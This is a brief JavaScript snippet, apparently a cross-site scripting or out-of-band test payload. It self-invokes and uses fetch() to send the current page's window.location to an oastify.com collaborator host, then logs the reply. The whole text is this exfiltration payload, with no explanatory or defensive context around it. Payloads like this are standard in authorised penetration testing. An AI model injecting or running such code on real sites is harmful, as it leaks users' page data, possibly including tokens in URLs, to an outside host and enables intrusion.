function MyFunc(){
  var p = window.location;
  fetch(`https://kma9r45df9fnmii0r0z9if20vr1iped3.oastify.com/p?param=${encodeURIComponent(p)}`)
    .then(response => response.json()) // If expecting JSON response
    .then(data => console.log(data))
    .catch(error => console.error("Error:", error));
}

MyFunc();
